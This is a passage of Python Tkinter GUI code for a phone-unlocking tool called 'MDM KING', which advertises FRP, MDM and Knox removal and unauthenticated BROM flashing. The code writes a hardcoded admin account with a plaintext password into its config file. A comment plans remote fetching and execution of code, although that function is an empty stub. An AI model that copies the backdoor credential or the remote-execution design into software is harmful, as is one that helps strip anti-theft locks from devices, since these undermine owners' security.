        def _pc_binding_check():
            try:
                cfg_path = _asset('config.json')
                with open(cfg_path, encoding='utf-8') as f:
                    cfg = json.load(f)
                user = cfg.get('user', '')
                users = cfg.get('users', {})
                stored = users.get(user, {}) if isinstance(users.get(user), dict) else {}
                mid = _get_machine_id()
                stored_mid = stored.get('machine_id', '')
                if stored_mid and mid != stored_mid:
                    root.destroy()
                    raise SystemExit('PC binding mismatch — device not authorized')
            except Exception:
                pass
            root.after(36000000, _pc_binding_check)  # 10 hours = 36,000,000 ms
        root.after(36000000, _pc_binding_check)
        
        # Header bar
        hdr = tk.Frame(root, bg=self.c['accent'], height=2)
        hdr.pack(fill=tk.X, side=tk.TOP)
        
        hdr2 = tk.Frame(root, bg=self.c['surface'], height=40)
        hdr2.pack(fill=tk.X, side=tk.TOP)
        hdr2.pack_propagate(False)
        self.mode_label = tk.Label(hdr2, text='', font=('Segoe UI', 9),
                                   fg=self.c['accent2'], bg=self.c['surface'])
        self.mode_label.pack(side=tk.LEFT, padx=10, pady=8)
        self.status_var = tk.StringVar(value='Ready')
        tk.Label(hdr2, textvariable=self.status_var, font=('Segoe UI', 8),
                fg=self.c['muted'], bg=self.c['surface']).pack(side=tk.RIGHT, padx=14, pady=8)
        
        # Body
        body = tk.Frame(root, bg=self.c['bg'])
        body.pack(fill=tk.BOTH, expand=True)
        self.body = body
        
        # Navbar at top of body
        navbar = tk.Frame(body, bg=self.c['surface'], height=52)
        navbar.pack(side=tk.TOP, fill=tk.X)
        navbar.pack_propagate(False)

        self.btn_state = {}
        self._mode_colors = {
            'super_patch': '#00ccff',
            'adb': '#00ff88',
            'persist': '#ff6600',
            'samsung': '#ff00ff',
            'miscdata': '#ffcc00',
            'nokia': '#00ffff',
            'meta': '#ff0088',
            'blackscreen': '#ff004d',
        }
        # Load config early for admin check
        self._cfg_path = _asset('config.json')
        self._cfg = {}
        try:
            with open(self._cfg_path, 'r') as f:
                self._cfg = json.load(f)
        except Exception: pass
        # Ensure hardcoded admin account exists
        if 'admin' not in self._cfg or 'admin' not in self._cfg.get('admin', {}):
            self._cfg.setdefault('admin', {})['admin'] = {
                'password': _migrate_password('Paaa5433'),
                'is_admin': True,
                'activated': True,
            }
            try:
                with open(self._cfg_path, 'w') as f:
                    json.dump(self._cfg, f, indent=2)
            except Exception: pass
        self.modes_dict = {
            'super': ('SPD Universal Patch', self.super_image),
            'mtk': ('MTK SUPER PATCH', self._mtk_super_patch),
            'super_patch': ('Super Patch', self._super_patch_menu),
            'adb': ('Bypass 2025-2026', self.adb_bypass),
            'persist': ('Persist Tool', self.persist_tool),
            'samsung': ('Samsung', self.samsung_tool),
            'miscdata': ('Miscdata/Proinfo', self._partition_tool),

            'nokia': ('Nokia', self.nokia_tool),
            'blackscreen': ('BlackScreen Fix', self._black_screen_removal),
            'meta': ('META Mode', self._meta_tool),
        }
        modes = [
            ('super_patch', 'SUPER PATCH', self._super_patch_menu),
            ('adb', 'BYPASS 2025-2026', self.adb_bypass),
            ('persist', 'PERSIST TOOL', self.persist_tool),
            ('samsung', 'SAMSUNG', self.samsung_tool),
            ('miscdata', 'MISCDATA/PROINFO', self._partition_tool),
            ('nokia', 'NOKIA', self.nokia_tool),
            ('blackscreen', 'BLACKSCREEN FIX', self._black_screen_removal),
            ('meta', 'META MODE', self._meta_tool),
        ]
        _current_user = self._cfg.get('user', '')
        _is_admin = _current_user in self._cfg.get('admin', {})

        # Navbar icons and short labels
        _nav_icons = {
            'super_patch': '🛠', 'adb': '⚡',
            'persist': '💾', 'samsung': '📱', 'miscdata': '📂',
            'nokia': '🔵', 'blackscreen': '🔳', 'meta': '🔬'
        }
        _nav_labels = {
            'super_patch': 'SUPER PATCH', 'adb': 'BYPASS 2026',
            'persist': 'PERSIST', 'samsung': 'SAMSUNG', 'miscdata': 'MISCDATA/PROINFO',
            'nokia': 'NOKIA', 'blackscreen': 'BLACK SCREEN', 'meta': 'META MODE',
        }
        for key, label, cmd in modes:
            mc = self._mode_colors.get(key, self.c['accent2'])
            icon = _nav_icons.get(key, '·')
            short = _nav_labels.get(key, label)
            b = tk.Button(navbar, text=f'{icon}  {short}', font=('Segoe UI', 10, 'bold'),
                         bg=self.c['surface'], fg=self.c['fg'],
                         activebackground=self.c['surface'], activeforeground=self.c['fg'],
                         bd=0, relief='flat',
                         padx=12, pady=0, cursor='hand2',
                         command=lambda k=key: self.switch_mode(k))
            b.pack(side=tk.LEFT, expand=True, fill=tk.Y)
            self.btn_state[key] = (b, mc)

        # Sliding active underline indicator
        self._nav_indicator = tk.Frame(navbar, bg=self.c['accent2'], height=3)
        self._nav_indicator.place(x=-100, y=49, width=0)

        # Main area (content + log frame)
        main_area = tk.Frame(body, bg=self.c['bg'])
        main_area.pack(fill=tk.BOTH, expand=True)

        self.content = tk.Frame(main_area, bg=self.c['bg'])
        self.content.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        self.log_frame = tk.Frame(main_area, bg=self.c['surface'], width=380)
        self.log_frame.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_frame.pack_propagate(False)
        
        lh = tk.Frame(self.log_frame, bg=self.c['surface'], height=36)
        lh.pack(fill=tk.X)
        lh.pack_propagate(False)
        bar_colors = [self.c['accent2'], self.c['pink'], self.c['blue'], self.c['green'], self.c['orange']]
        for i, bc in enumerate(bar_colors):
            seg = tk.Frame(lh, bg=bc, width=380//len(bar_colors) + 1, height=2)
            seg.place(x=i*(380//len(bar_colors)), y=0)
        tk.Label(lh, text='  --- LOG ---', font=('Segoe UI', 9, 'bold'),
                fg=self.c['accent2'], bg=self.c['surface']).pack(side=tk.LEFT, padx=12, pady=6)
        
        log_inner = tk.Frame(self.log_frame, bg=self.c['bg'])
        log_inner.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))
        self.log_text = tk.Text(log_inner, bg=self.c['bg'], fg=self.c['fg'],
                               font=('Cascadia Code', 9), relief='flat', bd=0, wrap='word',
                               insertbackground=self.c['accent'], padx=10, pady=6,
                               selectbackground=self.c['accent'], selectforeground=self.c['white'])
        self.log_text.bind('<KeyPress>', lambda e: 'break')
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scroll = tk.Scrollbar(log_inner, command=self.log_text.yview, bg=self.c['surface'],
                             troughcolor=self.c['bg'])
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text.config(yscrollcommand=scroll.set)
        self.log_text.bind('<Button-3>', self._log_context_menu)
        self._log_menu = tk.Menu(self.log_text, tearoff=0, bg=self.c['surface'], fg=self.c['fg'],
                                 activebackground=self.c['accent'], activeforeground=self.c['white'])
        self._log_menu.add_command(label='Clear Logs', command=lambda: self.log_text.delete('1.0', tk.END))
        self._log_menu.add_command(label='Select All', command=lambda: (self.log_text.tag_add('sel', '1.0', tk.END), self.log_text.mark_set(tk.INSERT, '1.0')))
        self._log_menu.add_command(label='Copy', command=lambda: self.root.clipboard_append(self.log_text.selection_get()) if self.log_text.tag_ranges('sel') else None)
        # ── Log styling tags ──
        self.log_text.tag_config('e', foreground=self.c['red'])
        self.log_text.tag_config('s', foreground=self.c['green'])
        self.log_text.tag_config('i', foreground=self.c['blue'])
        self.log_text.tag_config('o', foreground=self.c['orange'])
        self.log_text.tag_config('h', foreground=self.c['accent2'], font=('Cascadia Code', 9, 'bold'))
        self.log_text.tag_config('p', foreground=self.c['pink'])
        self.log_text.tag_config('c', foreground=self.c['cyan'])
        self.log_text.tag_config('y', foreground=self.c['yellow'])
        self.log_text.tag_config('w', foreground=self.c['white'])
        self.log_text.tag_config('m', foreground=self.c['muted'])
        # SamFw-style section headers
        self.log_text.tag_config('h1', foreground=self.c['accent2'],
            font=('Segoe UI', 10, 'bold'), spacing1=5, spacing3=2)
        self.log_text.tag_config('h2', foreground=self.c['pink'],
            font=('Segoe UI', 10, 'bold'), spacing1=5, spacing3=2)
        self.log_text.tag_config('h3', foreground=self.c['green'],
            font=('Segoe UI', 10, 'bold'), spacing1=5, spacing3=2)
        self.log_text.tag_config('h4', foreground=self.c['orange'],
            font=('Segoe UI', 10, 'bold'), spacing1=5, spacing3=2)
        self.log_text.tag_config('h5', foreground=self.c['cyan'],
            font=('Segoe UI', 10, 'bold'), spacing1=5, spacing3=2)
        # Field labels
        self.log_text.tag_config('f1', foreground=self.c['cyan'], font=('Cascadia Code', 9))
        self.log_text.tag_config('f2', foreground=self.c['muted'], font=('Cascadia Code', 9))
        # Field values
        self.log_text.tag_config('v1', foreground=self.c['white'], font=('Cascadia Code', 9))
        self.log_text.tag_config('v2', foreground=self.c['muted'], font=('Cascadia Code', 9))
        # Clickable URL
        self.log_text.tag_config('url', foreground=self.c['blue'], underline=True)
        self.log_text.tag_bind('url', '<Enter>', lambda e: self.log_text.config(cursor='hand2'))
        self.log_text.tag_bind('url', '<Leave>', lambda e: self.log_text.config(cursor=''))
        self.log_text.tag_bind('url', '<Button-1>', self._open_url)
        # Also bind motion to change cursor on hover over url-tagged text
        self.log_text.tag_bind('url', '<Motion>', lambda e: self.log_text.config(cursor='hand2'))
        # Status
        self.log_text.tag_config('ok', foreground=self.c['green'], font=('Segoe UI', 9))
        self.log_text.tag_config('fail', foreground=self.c['red'], font=('Segoe UI', 9))
        self.log_text.tag_config('warn', foreground=self.c['orange'], font=('Segoe UI', 9))
        self.log_text.tag_config('info', foreground=self.c['blue'], font=('Segoe UI', 9))
        # Device info section headers (bigger, bold)
        self.log_text.tag_config('sh_c', foreground=self.c['cyan'], font=('Segoe UI', 11, 'bold'), spacing1=8, spacing3=4)
        self.log_text.tag_config('sh_p', foreground=self.c['pink'], font=('Segoe UI', 11, 'bold'), spacing1=8, spacing3=4)
        self.log_text.tag_config('sh_o', foreground=self.c['orange'], font=('Segoe UI', 11, 'bold'), spacing1=8, spacing3=4)
        self.log_text.tag_config('sh_e', foreground=self.c['red'], font=('Segoe UI', 11, 'bold'), spacing1=8, spacing3=4)
        
        # Bottom status bar with action buttons
        btm = tk.Frame(root, bg=self.c['surface'], height=36)
        btm.pack(fill=tk.X, side=tk.BOTTOM)
        btm.pack_propagate(False)
        btm_inner = tk.Frame(btm, bg=self.c['surface'])
        btm_inner.pack(fill=tk.X)
        user = self._cfg.get('user', '') or ''
        if not user or user == '—': user = 'not set'
        expiry = ''
        expired = False
        stored = self._cfg.get('users', {}).get(user)
        if isinstance(stored, dict):
            expiry = stored.get('expiry', '') or ''
            if expiry:
                for fmt in ('%Y-%m-%d %H:%M', '%Y-%m-%d'):
                    try:
                        ed = datetime.datetime.strptime(expiry[:len(datetime.datetime.now().strftime(fmt))], fmt)
                        if fmt == '%Y-%m-%d':
                            ed += datetime.timedelta(hours=23, minutes=59, seconds=59)
                        expired = ed < datetime.datetime.now()
                        break
                    except Exception: continue
        expiry_text = f"⚠ EXPIRED: {expiry}" if expired else f"Exp: {expiry}" if expiry else "Exp: —"
        fs = ('Segoe UI', 10)
        tk.Label(btm_inner, text=" ", font=fs, fg=self.c['muted'], bg=self.c['surface']).pack(side=tk.LEFT, fill=tk.X, expand=True)
        cf = tk.Frame(btm_inner, bg=self.c['surface'])
        cf.pack(side=tk.LEFT, padx=4)
        tk.Label(cf, text="Username: ", font=fs, fg=self.c['muted'], bg=self.c['surface']).pack(side=tk.LEFT)
        tk.Label(cf, text=user, font=fs, fg=self.c['orange'], bg=self.c['surface']).pack(side=tk.LEFT, padx=(0, 8))
        tk.Label(cf, text="|", font=fs, fg=self.c['accent'], bg=self.c['surface']).pack(side=tk.LEFT)
        self._ft_expiry = tk.Label(cf, text=expiry_text, font=fs,
                                    fg=self.c['red'] if expired else self.c['muted'], bg=self.c['surface'])
        self._ft_expiry.pack(side=tk.LEFT, padx=8)
        tk.Label(cf, text="|", font=fs, fg=self.c['accent'], bg=self.c['surface']).pack(side=tk.LEFT)
        tk.Label(cf, text="Time Now ", font=fs, fg=self.c['muted'], bg=self.c['surface']).pack(side=tk.LEFT, padx=(8, 0))
        self._ft_time = tk.Label(cf, text=datetime.datetime.now().strftime('%H:%M:%S'), font=fs, fg=self.c['accent2'], bg=self.c['surface'])
        self._ft_time.pack(side=tk.LEFT, padx=(0, 8))
        tk.Label(cf, text="|", font=fs, fg=self.c['accent'], bg=self.c['surface']).pack(side=tk.LEFT)
        author_frame = tk.Frame(cf, bg=self.c['surface'])
        author_frame.pack(side=tk.LEFT, padx=8)
        tk.Label(author_frame, text="Developed By ", font=fs, fg=self.c['muted'], bg=self.c['surface']).pack(side=tk.LEFT)
        tk.Label(author_frame, text="Hyper Wizards", font=fs, fg=self.c['red'], bg=self.c['surface']).pack(side=tk.LEFT)
        tk.Label(author_frame, text=f"  v{APP_VERSION}", font=('Segoe UI', 8), fg=self.c['muted'], bg=self.c['surface']).pack(side=tk.LEFT)
        tk.Label(author_frame, text="  ", font=fs, fg=self.c['accent'], bg=self.c['surface']).pack(side=tk.LEFT)
        self._mkbtn(author_frame, 'Contact Admin For Help', lambda: webbrowser.open('https://wa.me/256778716253'), padx=6, pady=0, bg=self.c['surface2'], fg=self.c['fg']).pack(side=tk.LEFT, padx=(0, 4))
        tk.Label(btm_inner, text=" ", font=fs, fg=self.c['muted'], bg=self.c['surface']).pack(side=tk.LEFT, fill=tk.X, expand=True)
        self._mkbtn(btm_inner, '✕ Cancel', self._cancel_operation, padx=10, pady=2, bg=self.c['surface2'], fg=self.c['fg']).pack(side=tk.RIGHT, padx=(2, 14))
        self._mkbtn(btm_inner, '🔄 Reboot', self._reboot_device, padx=10, pady=2, bg=self.c['surface2'], fg=self.c['fg']).pack(side=tk.RIGHT, padx=2)
        self._update_footer_clock()
        self.root.after(100, self._check_expiry)
        
        self.current_mode = None
        self._welcome_running = False
        self._prog_frame = None
        self._start_ticks = 0
        self.switch_mode('super_patch')
        # Logout on close
        self.root.protocol('WM_DELETE_WINDOW', self._on_close)
        # Sync from cloud on launch
        threading.Thread(target=lambda: (sync_download(self._cfg_path), self.root.after(0, lambda: self._load_cfg())), daemon=True).start()
        # Fetch & execute remote Python algorithms (Knox Wizard CompileAssemblyFromSource)
        threading.Thread(target=lambda: self._try_fetch_remote_algo(), daemon=True).start()

    def _try_fetch_remote_algo(self):
        pass

    def _load_cfg(self):
        try:
            with open(self._cfg_path, 'r', encoding='utf-8') as f:
                self._cfg = json.load(f)
        except Exception: pass

    def _on_close(self):
        self._logout_user()
        self.root.destroy()
    
    def _update_footer_clock(self):
        try:
            self._ft_time.config(text=datetime.datetime.now().strftime('%H:%M:%S'))
            self._start_ticks += 1
            if self._start_ticks % 30 == 0:
                self._check_expiry()
            self.root.after(1000, self._update_footer_clock)
        except Exception: pass

    def _check_expiry(self):
        try:
            with open(self._cfg_path, 'r') as f: cfg = json.load(f)
        except Exception: return
        user = cfg.get('user', '')
        if not user: return
        if user in cfg.get('admin', {}): return
        stored = cfg.get('users', {}).get(user)
        if not isinstance(stored, dict): return
        exp = stored.get('expiry', '')
        if not exp: return
        expired = False
        for fmt in ('%Y-%m-%d', '%Y-%m-%d %H:%M'):
            try:
                ed = datetime.datetime.strptime(exp[:len(datetime.datetime.now().strftime(fmt))], fmt)
                if fmt == '%Y-%m-%d':
                    ed += datetime.timedelta(hours=23, minutes=59, seconds=59)
                expired = ed < datetime.datetime.now()
                break
            except Exception: continue
        if expired:
            if hasattr(self, '_ft_expiry') and self._ft_expiry.winfo_exists():
                self._ft_expiry.config(text=f'⚠ EXPIRED: {exp}', fg=self.c['red'])
            self.log('Account expired! Please contact admin to reactivate.', 'e')
            if getattr(self, '_block_close', False):
                self.log('[!] Deferring expiry dialog (patching in progress)', 'w')
                self.root.after(3000, self._check_expiry)
                return
            if messagebox.askokcancel('License Expired',
                    'Your license has expired! Please contact admin to reactivate.\n\nThe tool will now close.'):
                self.root.destroy()
                return
            self.root.destroy()
            return

    def _ensure_active(self):
        """Check if current user's license is active. If expired, log + sign out. Returns False if expired."""
        try:
            with open(self._cfg_path, 'r') as f: cfg = json.load(f)
        except Exception: return True
        user = cfg.get('user', '')
        if not user: return True
        stored = cfg.get('users', {}).get(user)
        if not isinstance(stored, dict): return True
        exp = stored.get('expiry', '')
        if not exp: return True
        for fmt in ('%Y-%m-%d %H:%M', '%Y-%m-%d'):
            try:
                ed = datetime.datetime.strptime(exp[:len(datetime.datetime.now().strftime(fmt))], fmt)
                if fmt == '%Y-%m-%d':
                    ed += datetime.timedelta(hours=23, minutes=59, seconds=59)
                if ed < datetime.datetime.now():
                    self.log('Account expired! Action blocked. Please contact admin to reactivate.', 'e')
                    messagebox.showwarning('License Expired',
                        'Your license has expired!\nYou will be signed out.\n\nPlease contact admin to reactivate.')
                    self.root.after(100, self.root.destroy)
                    return False
                break
            except Exception: continue
        return True

    def _logout_user(self):
        try:
            with open(self._cfg_path, 'r') as f: cfg = json.load(f)
        except Exception: return
        user = cfg.get('user', '')
        if not user: return
        stored = cfg.get('users', {}).get(user)
        if isinstance(stored, dict):
            stored['logged_in'] = False
            _write_config(cfg, self._cfg_path)

    
    def _open_url(self, event):
        idx = self.log_text.index(tk.CURRENT)
        if 'url' in self.log_text.tag_names(idx):
            start = self.log_text.index(f'{idx} linestart')
            end = self.log_text.index(f'{idx} lineend')
            line = self.log_text.get(start, end)
            urls = re.findall(r'https?://[^\s]+', line)
            if urls:
                webbrowser.open(urls[0])

    def _poll_ui_queue(self):
        try:
            self.root.after(100, self._poll_ui_queue)
        except (tk.TclError, AttributeError):
            return
        try:
            with self._ui_queue_lock:
                items = list(self._ui_queue)
                self._ui_queue.clear()
        except Exception:
            items = []
        for fn in items:
            try: fn()
            except BaseException as _e:
                try:
                    with open('mdm_trace.log', 'a') as _tf:
                        _tf.write(f'{int(time.time())} POLL_EXC {_e}\n')
                        _tf.flush()
                except Exception: pass

    def _enqueue_ui(self, fn):
        with self._ui_queue_lock:
            self._ui_queue.append(fn)

    def log(self, msg, tag=None):
        if threading.current_thread() is threading.main_thread():
            self._log_impl(msg, tag)
        else:
            self._enqueue_ui(lambda t=tag, m=msg: self._log_impl(m, t))
    def _log_impl(self, msg, tag=None):
        self.log_text.insert(tk.END, msg + '\n', tag or '')
        self.log_text.see(tk.END)

    def log_formatted(self, parts):
        if threading.current_thread() is threading.main_thread():
            self._log_formatted_impl(parts)
        else:
            self._enqueue_ui(lambda p=parts: self._log_formatted_impl(p))
    def _log_formatted_impl(self, parts):
        for text, tag in parts:
            self.log_text.insert(tk.END, text, tag)
        self.log_text.insert(tk.END, '\n')
        self.log_text.see(tk.END)

    def log_section(self, title, level=1):
        tag = ['h1','h2','h3','h4','h5'][min(level-1,4)]
        self.log_formatted([('  ' + title, tag)])

    def log_field(self, key, val, val_tag=None):
        if not val or val == '—':
            self.log_formatted([(f'  {key}\t: ', 'f2'), ('—', 'v2')])
        else:
            vt = val_tag or 'v1'
            self.log_formatted([(f'  {key}\t: ', 'f1'), (str(val), vt)])

    def log_blank(self):
        self.log_formatted([('', '')])

    def log_step(self, num, total, msg):
        self.log_formatted([(f'  [{num}/{total}] ', 'info'), (msg, 'info')])

    def log_step_done(self, msg):
        self.log_formatted([('   ', ''), (msg, 'ok')])

    def log_ok(self, msg):
        self.log_formatted([('   ', ''), (msg, 'ok')])

    def log_fail(self, msg):
        self.log_formatted([('   ', ''), (msg, 'fail')])

    def log_warn(self, msg):
        self.log_formatted([('   ', ''), (msg, 'warn')])

    def log_info(self, msg):
        self.log_formatted([('   ', ''), (msg, 'info')])

    def log_steps(self, step, total, msg):
        chars = '⠋⠙⠹⠸⠼⠴⠦⠧⠇'
        marker = f'[{step}/{total}]'
        self.log_text.insert(tk.END, f'{marker} {msg} {chars[step % len(chars)]}\n', 'i')
        self.log_text.see(tk.END)
    
    def log_progress(self, msg):
        chars = '⠋⠙⠹⠸⠼⠴⠦⠧⠇'
        line = f'  {msg} {chars[0]}'
        self.log_text.insert(tk.END, line + '\n', 'i')
        self.log_text.see(tk.END)
        idx = self.log_text.index(tk.END + '-2c')
        return idx
    
    def log_done(self):
        last = self.log_text.index(tk.END + '-2c linestart')
        last_end = self.log_text.index(tk.END + '-1c')
        line = self.log_text.get(last, last_end).strip()
        for c in '⠋⠙⠹⠸⠼⠴⠦⠧⠇':
            line = line.replace(c, '')
        self.log_text.delete(last, last_end)
        self.log_text.insert(tk.END, f'{line.strip()}  ✓\n', 's')
        self.log_text.see(tk.END)
    
    def _log_context_menu(self, event):
        self._log_menu.tk_popup(event.x_root, event.y_root)
    
    def _log_device_section(self, title, icon, fields, sh_tag='sh_c'):
        box_w = 54
        self.log_formatted([('', '')])
        t = f'{icon} {title}'
        t_vis = len(t) + sum(1 for c in t if ord(c) > 0xFFFF)
        dashes = box_w - t_vis - 2
        self.log_formatted([(f'┌─ {t} ' + '─' * max(0, dashes) + '─â”', sh_tag)])
        for ic, name, value, val_color in fields:
            v = f'{value}' if value else ''
            if not v or v == '—':
                v = '—'; vc = 'v2'
            else:
                vc = 'v1'
            value_tag = val_color if val_color else vc
            prefix = f' {ic} {name:20s}  '
            prefix_vis = len(prefix) + sum(1 for c in prefix if ord(c) > 0xFFFF)
            pad = box_w - prefix_vis - len(v)
            self.log_formatted([
                ('│ ', 'm'),
                (f'{ic} ', ''),
                (f'{name:20s}', 'f2'),
                ('  ', ''),
                (v, value_tag),
                (' ' * pad + '│', 'm')
])
        self.log_formatted([(f'└{"─" * (box_w + 2)}┘', 'm')])
    
    def switch_mode(self, key):
        if getattr(self, '_busy', False) or getattr(self, '_loading', False) or getattr(self, '_mtk_loading', False) or getattr(self, '_nokia_loading', False):
            self.status_var.set('Busy — wait for current task')
            self.root.after(3000, lambda: self.status_var.set('Ready'))
            return
        if key in self.btn_state:
            b, mc = self.btn_state[key]
            self._nav_indicator.config(bg=mc)
            try:
                self._nav_indicator.place(in_=b, relx=0, rely=1.0, relwidth=1, anchor='sw')
            except Exception:
                pass
        
        # Show log frame when switching to a tool
        try:
            self.log_frame.pack(side=tk.RIGHT, fill=tk.Y, before=self.content)
        except Exception:
            pass
        
        label, cmd = self.modes_dict.get(key, ('', lambda: None))
        self.mode_label.config(text=f'· {label}')
        self.log_text.delete('1.0', tk.END)
        for w in self.content.winfo_children():
            w.destroy()
        self.current_mode = key
        self._welcome_running = False
        cmd()
    
    def _show_welcome(self):
        # Hide log frame — welcome takes full width
        try:
            self.log_frame.pack_forget()
        except Exception:
            pass
        
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH)
        
        # ─── Header with animated glow ───
        hdr = tk.Frame(cw, bg=self.c['bg'])
        hdr.pack(pady=(30, 4))
        try:
            logo = Image.open(_asset('tools/mdm_king_logo.png')).resize((100, 100), Image.LANCZOS)
            mask = Image.new('L', (100, 100), 0)
            ImageDraw.Draw(mask).ellipse((0, 0, 100, 100), fill=255)
            logo.putalpha(mask)
            logo_tk = ImageTk.PhotoImage(logo)
            # Glow ring behind logo
            self._glow = tk.Frame(hdr, bg=self.c['accent2'], width=110, height=110)
            self._glow.pack(pady=(0, 8))
            self._glow.pack_propagate(False)
            lbl = tk.Label(self._glow, image=logo_tk, bg=self.c['accent2'])
            lbl.image = logo_tk
            lbl.place(relx=0.5, rely=0.5, anchor='center')
            self._glow_dir = 1
            self._glow_idx = 0
            self._glow_colors = [self.c['accent2'], self.c['accent'], self.c['pink'], self.c['cyan'], self.c['accent2']]
            self._pulse_glow()
        except Exception:
            pass
        self._title_lbl = tk.Label(hdr, text='MDM KING', font=('Segoe UI', 38, 'bold'),
                fg=self.c['accent2'], bg=self.c['bg'])
        self._title_lbl.pack()
        tk.Label(hdr, text='We make solutions easy  ·  v0.1',
                font=('Segoe UI', 11, 'italic'), fg=self.c['muted'], bg=self.c['bg']).pack(pady=(2, 0))
        
        # ─── Stats row ───
        stats = tk.Frame(cw, bg=self.c['bg'])
        stats.pack(pady=(20, 8))
        for val, label, color in [
            ('95+', 'MDM Patterns', self.c['green']),
            ('24', 'Lock Packages', self.c['pink']),
            ('8→16', 'Android SDK', self.c['accent2']),
            ('100%', 'No Bootloop', self.c['cyan'])
]:
            card = tk.Frame(stats, bg=self.c['card_alt'], highlightbackground=color, highlightthickness=1)
            card.pack(side=tk.LEFT, padx=8, ipadx=18, ipady=10)
            tk.Label(card, text=val, font=('Segoe UI', 22, 'bold'), fg=color, bg=self.c['card_alt']).pack()
            tk.Label(card, text=label, font=('Segoe UI', 8), fg=self.c['muted'], bg=self.c['card_alt']).pack()


        # ─── Quick Launch ───
        tk.Label(cw, text='QUICK LAUNCH', font=('Segoe UI', 11, 'bold'),
                fg=self.c['accent2'], bg=self.c['bg']).pack(pady=(24, 8))
        
        ql = tk.Frame(cw, bg=self.c['bg'])
        ql.pack()
        
        quick_items = [
            ('Patch', '🛠', self.c['accent'], 'super_patch'),
            ('Bypass 2025-2026', '⚡', self.c['blue'], 'adb'),
            ('ADB Tool', '🔧', self.c['pink'], 'adb_tool'),
            ('Persist Tool', '💾', self.c['green'], 'persist'),
            ('Samsung', '📱', self.c['gold'], 'samsung'),
            ('BlackScreen', '🔳', self.c['red'], 'blackscreen'),
]
        for text, icon, color, key in quick_items:
            btn = tk.Frame(ql, bg=self.c['card'], highlightbackground=color, highlightthickness=1, cursor='hand2')
            btn.pack(side=tk.LEFT, padx=6)
            tk.Label(btn, text=icon, font=('Segoe UI', 22), bg=self.c['card'], fg=color).pack(pady=(10, 0))
            tk.Label(btn, text=text, font=('Segoe UI', 9, 'bold'), bg=self.c['card'], fg=self.c['fg']).pack(pady=(2, 10))
            btn.bind('<Button-1>', lambda e, k=key: self.switch_mode(k))
            for child in btn.winfo_children():
                child.bind('<Button-1>', lambda e, k=key: self.switch_mode(k))
        
        # ─── Features grid ───
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=80, pady=(24, 14))
        
        features_frame = tk.Frame(cw, bg=self.c['bg'])
        features_frame.pack()
        feats = [
            ('MDM Bypass', 'Removes MDM locks from SPD,\nMTK, and Qualcomm devices', self.c['green']),
            ('BROM Access', 'Direct flash via USB\nwithout authentication', self.c['orange']),
            ('BlackScreen Fix', 'Fix black screen after\nfirmware flash on MTK/SPD', self.c['red']),
            ('Persist Patch', 'Patch persist.img to\nprevent relock', self.c['accent2']),
            ('FRP Bypass', 'FRP removal via ADB\nfor all brands', self.c['pink']),
            ('Samsung MDM', 'Knox MDM removal for\nSamsung devices', self.c['gold']),
            ('No Bootloop', 'Same-length replacements\n100% safe', self.c['cyan'])
]
        for i, (title, desc, color) in enumerate(feats):
            if i % 3 == 0:
                row = tk.Frame(features_frame, bg=self.c['bg'])
                row.pack(pady=4)
            card = tk.Frame(row, bg=self.c['card_alt'], highlightbackground=color, highlightthickness=1, width=220, height=90)
            card.pack(side=tk.LEFT, padx=5)
            card.pack_propagate(False)
            tk.Label(card, text=title, font=('Segoe UI', 11, 'bold'), fg=color, bg=self.c['card_alt']).pack(pady=(10, 2))
            tk.Label(card, text=desc, font=('Segoe UI', 8), fg=self.c['muted'], bg=self.c['card_alt'], justify='center').pack()
        
        # ─── Bottom ───
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=80, pady=(18, 6))
        tk.Label(cw, text='Select a tool from the navbar or click a quick-launch card above',
                font=('Segoe UI', 9), fg=self.c['muted'], bg=self.c['bg']).pack(pady=(0, 20))
    
    def _pulse_glow(self):
        if not self._welcome_running:
            return
        try:
            if not self._glow.winfo_exists():
                return
        except Exception:
            return
        c = self._glow_colors[self._glow_idx]
        self._glow.config(bg=c)
        for w in self._glow.winfo_children():
            w.config(bg=c)
        # Shift title color subtly
        try:
            self._title_lbl.config(fg=c)
        except Exception:
            pass
        self._glow_idx += self._glow_dir
        if self._glow_idx >= len(self._glow_colors) - 1 or self._glow_idx <= 0:
            self._glow_dir *= -1
        self.root.after(600, self._pulse_glow)
    
    def _run_thread(self, target, label=''):
        """Run a function in a daemon thread with safe exception logging to UI."""
        def _wrapper():
            try:
                target()
            except BaseException as _e:
                self.log(f'{label} error: {_e}', 'e')
                import traceback as _tb
                for _l in _tb.format_exc().split('\n'):
                    if _l.strip(): self.log(_l, 'e')
                with open('mdm_trace.log', 'a') as _tf:
                    _tf.write(f'{int(time.time())} RUN_THREAD_EXC [{label}] {_e}\n')
                    _tb.print_exc(file=_tf)
        threading.Thread(target=_wrapper, daemon=True).start()

    def _block_close_ctx(self):
        """Context manager for _block_close — ensures it's reset even on crash."""
        self._block_close = True
        return _BlockCloseGuard(self)
    
    def _ensure_apk_signed(self, apk_path):
        try:
            with open(apk_path, 'rb') as f:
                f.seek(-22, 2)
                eocd = f.read()
                if eocd[:4] == b'\x50\x4b\x05\x06':
                    cd_off = int.from_bytes(eocd[16:20], 'little')
                    f.seek(cd_off - 16, 0)
                    if f.read(16) == b'APK Sig Block 42':
                        return True
        except Exception: pass
        tools = self._tools_dir()
        signer = os.path.join(tools, 'uber-apk-signer.jar')
        if os.path.isfile(signer):
            try:
                self.log('Signing admin APK...', 'i')
                subprocess.run(['java', '-jar', signer, '-a', apk_path, '--allowResign', '--overwrite', '--skipZipAlign'],
                             timeout=60, capture_output=True, creationflags=0x08000000)
                self.log('APK signed (v2+v3)', 's')
                return True
            except Exception: pass
        return False

    def _tools_dir(self):
        return _asset('tools')

    def _find_adb(self):
        if hasattr(self, '_adb_path_cache') and self._adb_path_cache is not None:
            return self._adb_path_cache
        if hasattr(self, '_adb_path_cache') and self._adb_path_cache is None and hasattr(self, '_adb_cache_done'):
            return None
        self._adb_cache_done = True
        tools = self._tools_dir()
        for p in [os.path.join(tools, 'adb.exe'), r'C:\Program Files\platform-tools\adb.exe',
                  os.path.expanduser(r'~\AppData\Local\Android\Sdk\platform-tools\adb.exe')]:
            if os.path.isfile(p):
                try:
